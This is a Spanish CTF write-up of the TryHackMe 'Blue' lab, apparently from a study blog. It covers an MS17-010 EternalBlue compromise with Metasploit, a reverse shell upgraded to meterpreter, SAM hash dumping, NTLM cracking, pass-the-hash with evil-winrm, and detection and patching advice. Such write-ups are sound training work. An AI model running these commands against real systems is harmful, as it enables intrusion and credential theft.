@@ -1,0 +1,213 @@
+---
+title: Blue
+summary: Windows sin parchear con SMBv1 expuesto. EternalBlue (MS17-010) da una shell como SYSTEM sin credenciales; la paso a meterpreter, migro a un proceso estable, vuelco el SAM y crackeo el hash NTLM de Jon.
+date: 2026-11-04
+platform: thm
+os: windows
+difficulty: easy
+retired: true
+techniques: [ms17-010, credential-dumping, hash-cracking]
+tools: [nmap, metasploit, john, hashcat, smbclient, smbmap]
+tags: [windows, smb, metasploit, meterpreter]
+draft: false
+---
+
+## Resumen
+
+Blue cae en remoto por SMBv1 con **MS17-010 (EternalBlue)**, que da acceso directo como SYSTEM. Después vuelco los hashes, crackeo la contraseña de Jon y recojo las tres flags.
+
+| Campo | Valor |
+| --- | --- |
+| IP objetivo | `10.129.151.115` |
+| Hostname | `WIN-JO6REVNMMMP` |
+| SO (según nmap) | Windows Server 2012 R2 Datacenter 9600 |
+| Vulnerabilidad | MS17-010, CVE-2017-0143 |
+| Acceso inicial | `NT AUTHORITY\SYSTEM` |
+
+La cadena completa:
+
+1. Escaneo de puertos y servicios con nmap.
+2. Detección de MS17-010 con los scripts `smb-vuln*`.
+3. Explotación con `exploit/windows/smb/ms17_010_eternalblue`.
+4. Conversión de la shell a meterpreter, `getsystem` y `migrate`.
+5. `hashdump` y cracking del hash NTLM de Jon con John the Ripper.
+6. Recogida de las tres flags.
+
+## Reconocimiento
+
+La máquina no responde a ping, así que todos los escaneos llevan `-Pn`. Primero todos los puertos TCP y después versiones y scripts por defecto solo sobre los abiertos:
+
+```bash
+sudo nmap -p- -sS --min-rate 5000 -n -Pn 10.129.151.115 -oG allPorts
+sudo nmap -sCV -p135,139,445,3389,5985,47001,49152,49153,49154,49155,49171,49172,49199 -n -Pn 10.129.151.115 -oA targeted
+```
+
+| Puerto | Servicio | Versión / nota |
+| --- | --- | --- |
+| 135/tcp | msrpc | Microsoft Windows RPC |
+| 139/tcp | netbios-ssn | Microsoft Windows netbios-ssn |
+| 445/tcp | microsoft-ds | Windows Server 2012 R2 Datacenter 9600 |
+| 3389/tcp | ms-wbt-server | RDP; útil si consigo credenciales |
+| 5985/tcp | http | WinRM; útil con credenciales o hash (evil-winrm) |
+| 47001/tcp | http | WinRM interno, sin interés |
+| 49152-49199/tcp | msrpc | Puertos RPC dinámicos, normales en Windows |
+
+Lo que importa de los scripts de nmap:
+
+- **smb-security-mode**: `account_used: guest`. El servidor acepta sesión de invitado.
+- **message_signing: disabled**: la firma SMB no es obligatoria. Aquí no se usa, pero en una red con más equipos abre la puerta a ataques de relay.
+- **smb-os-discovery**: Windows Server 2012 R2 Datacenter, hostname `WIN-JO6REVNMMMP`, grupo `WORKGROUP`.
+
+Un Windows antiguo con SMB expuesto: antes de buscar nada más complejo, toca comprobar las vulnerabilidades conocidas de SMB.
+
+## Enumeración: MS17-010
+
+Los scripts de vulnerabilidades SMB de nmap lo confirman:
+
+```bash
+nmap -p445 --script "smb-vuln*" -Pn 10.129.151.115
+```
+
+```text
+| smb-vuln-ms17-010:
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+...
+```
+
+MS17-010 es el boletín de marzo de 2017 que corrige varios fallos de SMBv1; el que explota EternalBlue (el exploit de la NSA filtrado por Shadow Brokers y usado después por WannaCry) está en `srv.sys`, el controlador de SMB del kernel. Al convertir una lista de atributos extendidos del formato de OS/2 al de NT calcula mal el tamaño y desborda un búfer del pool del kernel. El exploit prepara la memoria para que ese desbordamiento acabe ejecutando su shellcode, y como el código corre en el kernel, la shell llega directamente como SYSTEM. Sin credenciales y sin interacción del usuario.
+
+El escáner de Metasploit es otra forma de comprobarlo:
+
+```text title="msfconsole"
+use auxiliary/scanner/smb/smb_ms17_010
+set RHOSTS 10.129.151.115
+set CHECK_PIPE true
+run
+```
+
+Y ya que el servidor acepta invitados, también reviso los recursos compartidos:
+
+```bash
+smbclient -L //10.129.151.115 -N
+smbmap -H 10.129.151.115 -u guest
+```
+
+## Acceso inicial: EternalBlue
+
+En `search ms17-010` salen varios módulos. Los de `auxiliary/` solo comprueban; el que ataca es el que empieza por `exploit/`:
+
+```text title="msfconsole"
+use exploit/windows/smb/ms17_010_eternalblue
+show options
+set RHOSTS 10.129.151.115
+set LHOST {{LHOST}}
+set payload windows/x64/shell/reverse_tcp
+run
+```
+
+- **RHOSTS** es la única opción obligatoria que viene vacía.
+- **LHOST** tiene que ser la IP de la interfaz que ve al objetivo (`tun0` con la VPN, o la de la AttackBox). Si está mal, el exploit corre pero la shell no llega nunca.
+- Uso el payload `shell/reverse_tcp`, una shell cmd normal, para practicar después la conversión a meterpreter.
+
+Cuando aparece la consola de Windows la mando a segundo plano con `CTRL+Z`.
+
+En Windows Server 2012 este módulo puede ser inestable y tumbar la máquina. La alternativa es `exploit/windows/smb/ms17_010_psexec`, que en vez de corromper memoria del kernel abusa de otro fallo del mismo boletín, pero necesita un *named pipe* accesible.
+
+## Escalada: de shell a meterpreter estable
+
+Convierto la shell en una sesión de meterpreter con un módulo de post-explotación. La opción obligatoria es `SESSION`, el número de la shell en segundo plano:
+
+```text title="msfconsole"
+sessions -l
+use post/multi/manage/shell_to_meterpreter
+set SESSION 1
+run
+sessions -l
+sessions -i 2
+```
+
+Si la conversión se queda colgada, basta con repetir el `run`. Ya en meterpreter:
+
+```text title="meterpreter"
+getsystem
+getuid          # NT AUTHORITY\SYSTEM
+ps              # un proceso de SYSTEM hacia el final de la lista
+migrate <PID>   # p. ej. winlogon.exe o spoolsv.exe
+```
+
+EternalBlue ya da SYSTEM, así que `getsystem` solo lo confirma. El paso importante es `migrate`: aunque `getuid` diga SYSTEM, el proceso donde vive meterpreter puede ser inestable o de 32 bits. Migrar a un proceso de SYSTEM de 64 bits hace que la sesión aguante y que comandos como `hashdump` funcionen. A veces hacen falta varios intentos o probar con otro proceso.
+
+## Credenciales: volcado del SAM y cracking
+
+Windows guarda los hashes NTLM de las cuentas locales en `C:\Windows\System32\config\SAM`, que solo puede leer SYSTEM. `hashdump` los vuelca:
+
+```text title="meterpreter"
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:...:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:...:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:{{HASH}}:::
+```
+
+| Campo | Ejemplo (Jon) | Significado |
+| --- | --- | --- |
+| Usuario | Jon | Nombre de la cuenta |
+| RID | 1000 | 500 es Administrator y 501 Guest; de 1000 en adelante, cuentas creadas a mano |
+| Hash LM | `aad3b435…` | El valor de una contraseña vacía: LM está desactivado y no sirve |
+| Hash NT | el cuarto campo | El que se crackea o se reutiliza |
+
+El usuario que no viene por defecto es **Jon**. Crackeo su hash en mi máquina con diccionario:
+
+```bash
+echo 'Jon:1000:aad3b435b51404eeaad3b435b51404ee:{{HASH}}:::' > hash.txt
+john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+john --show --format=NT hash.txt
+# o con hashcat
+hashcat -m 1000 '{{HASH}}' /usr/share/wordlists/rockyou.txt
+```
+
+La contraseña está en rockyou y cae en segundos. Aunque no cayera, el hash sirve tal cual para *pass-the-hash* contra WinRM, SMB o RDP:
+
+```bash
+evil-winrm -i 10.129.151.115 -u Jon -H '{{HASH}}'
+```
+
+## Flags
+
+Las tres flags representan sitios clave de Windows. Una sola búsqueda desde meterpreter las encuentra todas:
+
+```text title="meterpreter"
+search -f flag*.txt
+cat C:\\flag1.txt
+cat C:\\Windows\\System32\\config\\flag2.txt
+cat C:\\Users\\Jon\\Documents\\flag3.txt
+```
+
+| Flag | Ruta | Por qué ahí |
+| --- | --- | --- |
+| 1 | `C:\flag1.txt` | La raíz del sistema |
+| 2 | `C:\Windows\System32\config\flag2.txt` | La carpeta del SAM, donde Windows guarda las contraseñas |
+| 3 | `C:\Users\Jon\Documents\flag3.txt` | Los documentos de un usuario, buen sitio para saquear |
+
+En meterpreter las barras invertidas van dobles. La flag 2 a veces la borra Windows; si no aparece, reinicio la máquina y repito la explotación.
+
+## Cómo se detecta y se corrige
+
+- **MS17-010**: aplicar el parche y desactivar SMBv1, que ningún Windows actual necesita (`Set-SmbServerConfiguration -EnableSMB1Protocol $false`). El 445 no debería ser accesible fuera de la red interna. Los IDS tienen firmas para la explotación de MS17-010 (las reglas de Emerging Threats las incluyen), y un intento fallido suele acabar en pantallazo azul, que también es una pista.
+- **Sesión de invitado y firma SMB**: desactivar la cuenta Guest y exigir la firma SMB para cortar el relay.
+- **Migrate y hashdump**: los dos inyectan código en otros procesos; `hashdump` de meterpreter lo hace en `lsass.exe`. Sysmon los ve con el evento 8 (CreateRemoteThread) y el 10 (acceso a `lsass.exe`), y un EDR los suele bloquear.
+- **Contraseña débil**: NTLM no lleva sal, así que un hash de una contraseña de rockyou cae en segundos. Contraseñas largas comprobadas contra listas de filtradas, y LAPS para que cada equipo tenga una contraseña local distinta y un hash robado no sirva en otro.
+
+## Lo que me llevo
+
+Un Windows antiguo con SMB abierto se comprueba primero contra vulnerabilidades conocidas: `nmap --script "smb-vuln*"` cuesta segundos y aquí da la máquina entera. Lo demás es la secuencia estándar tras comprometer un Windows, y la que más me sirve de cara al eJPT: sesión estable, SYSTEM, `migrate`, `hashdump` y crackear o reutilizar lo que salga.
+
+- En Metasploit, `auxiliary/` comprueba y `exploit/` ataca.
+- Si la shell no llega, lo primero es revisar `LHOST`.
+- Saqueo: raíz de `C:\`, Desktop y Documents de cada usuario, y `search -f`.
+- Apuntar IP, usuarios, hashes y rutas: el examen pregunta datos concretos.
+
+Las siguientes de la serie son Ice y Blaster.
